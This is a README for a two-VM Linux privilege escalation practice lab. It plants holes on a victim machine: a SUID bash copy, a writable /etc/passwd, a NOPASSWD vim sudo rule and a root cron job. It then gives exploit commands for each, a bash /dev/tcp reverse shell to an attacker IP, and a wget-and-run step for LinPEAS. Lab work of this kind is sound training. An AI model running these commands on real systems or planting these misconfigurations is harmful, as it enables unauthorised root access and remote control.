🛡️ Linux Privilege Escalation Sandbox (Two-VM Lab)

## Overview
This project sets up a realistic **Linux privilege escalation lab** using two virtual machines:
- **Attacker VM:** Parrot OS Security Edition
- **Victim VM:** Linux Mint 21.x (XFCE recommended)

The attacker gains initial low-privileged SSH access to the victim and then systematically enumerates and exploits local misconfigurations to escalate to root access.

---

## Lab Architecture

| Component     | Details                                     |
|---------------|--------------------------------------------|
| Attacker VM   | Parrot OS Security Edition                 |
| Victim VM     | Linux Mint 21.x XFCE                      |
| Network       | Host-Only or Internal NAT (same subnet)    |
| Resources     | Each VM: 2–4 vCPUs, 8 GB RAM, 64 GB HDD |


---

## Setup Instructions

### Victim VM (Linux Mint)
✅ Create low-privileged user:
```bash
sudo adduser intern
sudo passwd intern
```

✅ Install and start SSH:
```bash
sudo apt install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh
```

✅ Plant misconfigurations:
```bash
# SUID Bash
sudo cp /bin/bash /usr/local/bin/suidbash
sudo chmod u+s /usr/local/bin/suidbash

# Writable /etc/passwd
sudo chmod o+w /etc/passwd

# Misconfigured sudo rule
echo "intern ALL=(ALL) NOPASSWD: /usr/bin/vim" | sudo tee -a /etc/sudoers

# Cron job for root shell
echo "* * * * * root bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'" | sudo tee -a /etc/crontab
```

### Attacker VM (Parrot OS)
✅ Ensure SSH, Nmap, Netcat, and LinPEAS are available.

✅ Verify connectivity:
```bash
ping <victim-ip>
ssh intern@<victim-ip>
```

---

## Attack Workflow

### Step 1: Recon
```bash
nmap -sV <victim-ip>
```

### Step 2: Initial Access
```bash
ssh intern@<victim-ip>
```

### Step 3: Local Enumeration (Manual)
```bash
id; whoami; sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; crontab -l; cat /etc/crontab
```

### Step 4: Local Enumeration (Automated)
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Step 5: Exploitation
| Misconfig          | Exploit Command                                                      |
|--------------------|----------------------------------------------------------------------|
| SUID Bash          | `/usr/local/bin/suidbash -p`                                         |
| Writable passwd    | `echo 'intern::0:0:root:/root:/bin/bash' >> /etc/passwd; su - intern` |
| Misconfigured sudo | `sudo vim -c ':!bash'`                                              |
| Cron Abuse         | Wait, then `/tmp/rootbash -p`                                       |

### Optional: Reverse Shell
```bash
# On attacker VM
nc -lvnp 4444

# On victim VM
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
```

---

## Hardening (Post-Lab Cleanup)
- Remove SUID bit:
  ```bash
  sudo chmod u-s /usr/local/bin/suidbash
  ```
- Reset /etc/passwd permissions:
  ```bash
  sudo chmod o-w /etc/passwd
  ```
- Remove sudoers rule:
  ```bash
  sudo visudo  # remove 'intern' entry
  ```
- Clean cron jobs:
  ```bash
  sudo nano /etc/crontab
  sudo rm /tmp/rootbash
  ```

---

## Project Summary
> Built a two-VM Linux privilege escalation lab simulating an attacker using Parrot OS to compromise a Linux Mint victim system. Successfully gained low-privileged access, enumerated misconfigurations, and executed privilege escalation attacks to obtain root. Documented mitigation strategies and cleanup procedures.

**Skills:** Remote Access · Linux Post-Exploitation · Privilege Escalation · SUID/Capabilities Exploitation · Enumeration Tools · Red Team Simulation · Vulnerability Simulation


---

## Deliverables
✅ Screenshots of enumeration and exploits  
✅ Command logs or transcripts  
✅ This README.md  
✅ Optional: Summary report outlining key lessons and mitigations
